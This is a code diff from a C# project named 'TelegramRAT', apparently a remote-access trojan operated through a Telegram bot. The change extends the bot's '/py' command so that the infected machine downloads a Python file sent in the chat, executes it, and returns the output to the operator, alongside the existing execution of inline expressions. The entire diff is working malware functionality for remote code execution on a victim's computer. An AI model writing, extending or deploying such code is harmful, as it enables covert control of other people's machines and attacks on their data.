@@ -389,7 +389,7 @@ namespace TelegramRAT
                         ReportError(update, ex);
                     }
                 }
-                
+
             });
 
             //DOWNLOAD
@@ -1446,9 +1446,7 @@ namespace TelegramRAT
             commands.Add(new BotCommand
             {
                 Command = "/py",
-                MayHaveNoArgs = false,
-                IgnoreCountArgs = true,
-                Description = "Execute python expression. Mind that all expressions execute in the same script scope. To clear scope /pyclearscope",
+                Description = "Execute python expression or file. To execute file send it and reply to it with command /py. Mind that all expressions and files execute in the same script scope. To clear scope /pyclearscope",
                 Example = "/py print('Hello World')",
                 Execute = (model, update) =>
                 {
@@ -1456,32 +1454,73 @@ namespace TelegramRAT
                     {
                         try
                         {
-                            Console.WriteLine("Python must execute:" + model.RawArgs);
-                            MemoryStream pyOutput = new MemoryStream();
-                            var pyStream = new MemoryStream();
-                            pythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);
-
-                            pythonEngine.Execute(model.RawArgs, pythonScope);
-                            pyStream.Position = 0;
-
-                            if (pyStream.Length > 0)
+                            if (update.Message.ReplyToMessage == null || update.Message.ReplyToMessage.Type != MessageType.Document)
                             {
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output:\n{new StreamReader(pyStream).ReadToEnd()}", replyToMessageId: update.Message.MessageId);
+                                if (model.Args.Length < 1)
+                                {
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Need an expression or file to execute", replyToMessageId: update.Message.MessageId);
+                                    return;
+                                }
+                                Console.WriteLine("Python must execute:" + model.RawArgs);
+                                MemoryStream pyOutput = new MemoryStream();
+                                var pyStream = new MemoryStream();
+                                pythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);
+
+                                pythonEngine.Execute(model.RawArgs, pythonScope);
+                                pyStream.Position = 0;
+
+                                if (pyStream.Length > 0)
+                                {
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output:\n{new StreamReader(pyStream).ReadToEnd()}", replyToMessageId: update.Message.MessageId);
+                                }
+                                else
+                                {
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Executed!", replyToMessageId: update.Message.MessageId);
+                                }
+                                pyStream.Position = 0;
+                                Console.WriteLine("Output: " + new StreamReader(pyStream).ReadToEnd() + " len:" + pyStream.Length);
+                                pyStream.Close();
+                                return;
                             }
-                            else
+                            if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Document)
                             {
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Executed!", replyToMessageId: update.Message.MessageId);
+                                if (!update.Message.ReplyToMessage.Document.FileName.Contains(".py"))
+                                {
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This is not python script!", replyToMessageId: update.Message.MessageId);
+                                    return;
+                                }
+                                MemoryStream outputStream = new MemoryStream();
+                                var scriptFileStream = System.IO.File.Create("UserScript.py");
+                                pythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);
+
+                                var file = Bot.GetFileAsync(update.Message.ReplyToMessage.Document.FileId).Result;
+                                Bot.DownloadFileAsync(file.FilePath, scriptFileStream).Wait();
+                                Console.WriteLine("len: " + scriptFileStream.Length);
+                                scriptFileStream.Close();
+
+                                pythonEngine.ExecuteFile("UserScript.py", pythonScope);
+
+                                outputStream.Position = 0;
+
+                                string outputText = new StreamReader(outputStream).ReadToEnd();
+
+                                Console.WriteLine(outputText);
+
+                                if (outputText.Length > 0)
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output: {outputText}", replyToMessageId: update.Message.MessageId);
+                                else
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed!", replyToMessageId: update.Message.MessageId);
+
+                                //System.IO.File.Delete("UserScript.py");
+                                outputStream.Close();
                             }
-                            pyStream.Position = 0;
-                            Console.WriteLine("Output: " + new StreamReader(pyStream).ReadToEnd() + " len:" + pyStream.Length);
-                            pyStream.Close();
 
                         }
                         catch (Exception ex)
                         {
                             ReportError(update, ex);
                         }
-                        
+
                     });
                 }
             });
